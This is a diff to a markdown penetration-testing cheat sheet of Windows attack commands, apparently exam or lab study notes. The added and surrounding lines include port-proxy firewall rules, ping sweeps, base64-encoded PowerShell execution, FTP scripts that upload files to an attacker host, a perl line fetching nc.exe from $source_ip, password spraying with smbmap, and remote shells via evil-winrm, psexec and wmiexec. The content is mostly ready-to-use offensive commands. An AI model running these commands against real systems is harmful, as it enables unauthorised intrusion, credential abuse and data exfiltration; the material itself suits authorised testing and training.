@@ -8,12 +8,25 @@ net use z: \\$source_ip\$smb_share
 ```bash
 //$source_ip/$smb_share/tools_windows/bin/whoami.exe
 ```
+```bash
+//$source_ip/$smb_share/tools_windows/bin/whoami.exe /priv
 ```
+```bash
 netsh advfirewall firewall add rule name="forward_port_rule" prot ocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
 netsh interface portproxy add v4tov4 listenport=4455 listenaddres s=10.11.0.22 connectport=445 connectaddress=192.168.1.110
 ```
-```
+```bash
 for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && e cho 10.5.5.%i is up.
+```
+```bash
+xfreerdp +nego +sec-rdp +sec-tls +sec-nla /d: /u: /p: /v:ExampleHost /u:administrator /p:password /size:1180x708
+```
+Powershell Encode:
+```
+iconv -f ASCII -t UTF-16LE powershell_command.txt | base64 | tr -d '\n'
+```
+```
+powershell.exe -EncodedCommand <Base64-Encoded-Command>
 ```
 ## Enumeration Scripts
 ```bash
@@ -113,6 +126,14 @@ icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
 Check service status:
 ```
 wmic service where caption="Serviio" get name, caption, state, startmode
+```
+
+Ports:
+```
+netstat -ano
+```
+```
+tasklist | findstr <PID>
 ```
 
 ### Domain Enumeration
@@ -556,7 +577,18 @@ Perl:
 perl -le "use File::Fetch; my $ff = File::Fetch->new(uri => 'http://$source_ip/tools_windows/bin/nc.exe'); my $file = $ff->fetch() or die $ff->error;"
 
 ```
-
+```
+python -m pyftpdlib -p 21 -w
+```
+```bash
+echo open $source_ip 21> ftp.txt
+echo USER anonymous>> ftp.txt # username
+echo "">> ftp.txt # password
+echo bin>> ftp.txt # binary mode
+echo PUT [file]>> ftp.txt
+echo bye>> ftp.txt
+ftp -v -n -s:ftp.txt
+```
 ```bash
 echo open $source_ip 21> ftp.txt
 echo USER offsec>> ftp.txt # username
@@ -655,9 +687,19 @@ copy //$source_ip/$smb_share/tools_windows/bin/whoami.exe
 ```
 
 ## Using Credentia
-```
-while read USER; do echo $USER && smbmap -H 10.10.10.172 -u "$USER" -p "$USER"; done < usernames 
+```bash
+while read USER; do echo $USER && smbmap -H $target -u "$USER" -p "$USER"; done < usernames 
 ``` 
+
+```bash
+/opt/evil-winrm/evil-winrm.rb -u <username> -p <password> -i $target
+```
+```bash
+psexec <username>:<password>@$target cmd.exe
+```
+```bash
+/usr/share/doc/python-impacket/examples/wmiexec.py <domain>/<username>:<password>@$target cmd.exe
+```
 
 ```powershell
 $username = '<username here>'
